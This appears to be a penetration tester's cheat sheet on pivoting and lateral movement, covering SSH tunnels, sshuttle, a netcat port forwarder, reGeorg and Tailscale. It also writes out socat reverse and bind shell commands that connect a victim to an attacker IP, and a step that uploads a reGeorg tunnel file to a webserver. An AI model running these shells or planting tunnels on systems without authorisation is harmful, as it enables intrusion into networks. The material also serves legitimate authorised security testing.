#pivoting #lateral-movement
# Check if your tunnel is active and running: 

- nc -z localhost port || echo 'no tunnel open'
- netstat -lpnt | grep port | grep ssh
- ps aux | grep ssh
- ss -ntlp

# SSH Tunneling

Note: Target must have SSH running for there service

1. Create SSH Tunnel: ssh -D localhost:local port -f -N user@localhost -p Target Port
2. Setup ProxyChains. Edit the following config file (/etc/proxychains.conf)
3. Add the following line into the config: Socks5 127.0.0.1 Local Port
4. Run commands through the tunnel: proxychains command

# SShuttle

In Kali

Source: https://github.com/sshuttle/sshuttle

- sshuttle -r root@172.21.0.0 10.2.2.0/24
- sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa' # Daemon mode
- sshuttle -D --dns -vr user@yourserver.com 0/0 --ssh-cmd 'ssh -i /your/key/path.pem' # Daemon mode with DNS
- Working with your .ssh/config:
```
sshuttle --dns -vr user@server 0/0 --ssh-cmd 'ssh jumpbox'
sshuttle --dns -r myserver 0/0 -x <server-IP>
```

# Socat

## Bind Shell

```
victim> socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:443
```

## Reverse Shell

```
attacker> socat TCP-LISTEN:443,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:443 EXEC:bash,pty,stderr,setsid,sigint,sane
```

# Port Forwarder
1. mknod pivot p
2. nc -l -p < port to listen on> 0<pivot | nc "target" "pivot-port" 1>pivot

# reGeorg

Source: https://github.com/sensepost/reGeorg

Note: reGeorg requires Python 2.7 and the following modules:

urllib3 - HTTP library with thread-safe connection pooling, file post, and more.

1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver
2. Configure the tool to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py
```
python reGeorgSocksProxy.py -p 8080 -u http://upload.megacorpone.net:8080/tunnel/tunnel.jsp
```

# TailScale

Tailscale is a secure, peer-to-peer Virtual Private Network (VPN) service built on the WireGuard protocol. It simplifies network connectivity by creating a private mesh network between devices, regardless of their physical location, using public key authentication. Tailscale is ideal for securely accessing resources like internal servers or databases without complex firewall configurations or exposing them to the internet.

## A WORD OF CAUTION:

 Depending on the assessment or engagement, using tailscale as a peer to peer will send traffic between your system and there servers to access the target system you are using. Take caution and consult with the client for approval to use tailscale. 

# Setting up Tailscale for Linux: 

Source: https://tailscale.com/download/linux
Source for the Oneliner: https://github.com/tailscale/tailscale/blob/main/scripts/installer.sh

Oneliner: curl -fsSL https://tailscale.com/install.sh | sh

Note you will need sudo access to run tailscale on linux. 

Starting tailscale on linux: 

- sudo tailscale up
-  sudo tailscale login

Once you are connected you can check to see what IP Address is given you: 
-  sudo tailscale -ip 4

# TailScale Linux Client Help Menu

```
The easiest, most secure way to use WireGuard.

USAGE
  tailscale [flags] <subcommand> [command flags]

For help on subcommands, add --help after: "tailscale status --help".

This CLI is still under active development. Commands and flags will
change in the future.

SUBCOMMANDS
  up          Connect to Tailscale, logging in if needed
  down        Disconnect from Tailscale
  set         Change specified preferences
  login       Log in to a Tailscale account
  logout      Disconnect from Tailscale and expire current node key
  switch      Switches to a different Tailscale account
  configure   [ALPHA] Configure the host to enable more Tailscale features
  netcheck    Print an analysis of local network conditions
  ip          Show Tailscale IP addresses
  dns         Diagnose the internal DNS forwarder
  status      Show state of tailscaled and its connections
  ping        Ping a host at the Tailscale layer, see how it routed
  nc          Connect to a port on a host, connected to stdin/stdout
  ssh         SSH to a Tailscale machine
  funnel      Serve content and local servers on the internet
  serve       Serve content and local servers on your tailnet
  version     Print Tailscale version
  web         Run a web server for controlling Tailscale
  file        Send or receive files
  bugreport   Print a shareable identifier to help diagnose issues
  cert        Get TLS certs
  lock        Manage tailnet lock
  licenses    Get open source license information
  exit-node   Show machines on your tailnet configured as exit nodes
  update      Update Tailscale to the latest/different version
  whois       Show the machine and user associated with a Tailscale IP (v4 or v6)
  drive       Share a directory with your tailnet
  completion  Shell tab-completion scripts     
```
## Check for other connections:

- sudo tailscale -status
## SSH through Tailscale:

- sudo tailscale ssh "IP Address"
- sudo tailscale "Hostname"



